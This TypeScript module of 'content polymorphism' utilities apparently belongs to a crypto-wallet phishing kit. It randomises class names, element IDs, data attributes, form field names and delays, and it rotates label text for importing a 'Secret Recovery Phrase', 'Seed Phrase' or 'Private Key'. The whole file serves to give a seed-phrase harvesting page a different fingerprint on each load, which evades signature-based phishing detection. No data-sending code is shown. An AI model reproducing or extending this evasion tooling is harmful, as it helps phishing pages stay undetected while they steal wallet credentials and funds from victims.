// Content polymorphism utilities
const r = () => Math.random();
const rInt = (min: number, max: number) => Math.floor(r() * (max - min + 1)) + min;
const rHex = (len: number) => Array.from({ length: len }, () => rInt(0, 15).toString(16)).join('');

// Generate random class suffix
export const rc = () => `_${rHex(6)}`;

// Generate random ID
export const rid = () => `el_${rHex(8)}`;

// Random delay
export const rd = (min = 100, max = 300) => new Promise(resolve => setTimeout(resolve, rInt(min, max)));

// Text variations
const tv = {
  import: ['Import', 'Import Wallet', 'Continue', 'Proceed', 'Import Now'],
  phrase: ['Secret Recovery Phrase', 'Recovery Phrase', 'Seed Phrase', 'Secret Phrase', 'Backup Phrase'],
  privateKey: ['Private Key', 'Private Access Key', 'Key', 'Access Key'],
  back: ['Back', 'Go Back', 'Return', '← Back'],
  help: ['Help', 'Support', 'Get Help', 'Need Help?'],
  step: ['Step', 'Phase', 'Stage'],
};

// Get random text variation
export const gt = (key: keyof typeof tv) => {
  const variants = tv[key];
  return variants[rInt(0, variants.length - 1)];
};

// Random attribute generator
export const ra = () => ({
  'data-id': rHex(8),
  'data-ref': rHex(6),
  'data-key': rHex(10)
});

// Shuffle array
export const shuffle = <T>(arr: T[]): T[] => {
  const shuffled = [...arr];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = rInt(0, i);
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled;
};

// Dynamic class name generator
export const dc = (...classes: string[]) => {
  return classes.map(c => `${c}${rc()}`).join(' ');
};

// Field name obfuscator
const fieldMap = new Map<number, string>();
export const fn = (index: number): string => {
  if (!fieldMap.has(index)) {
    fieldMap.set(index, `f_${rHex(8)}`);
  }
  return fieldMap.get(index)!;
};
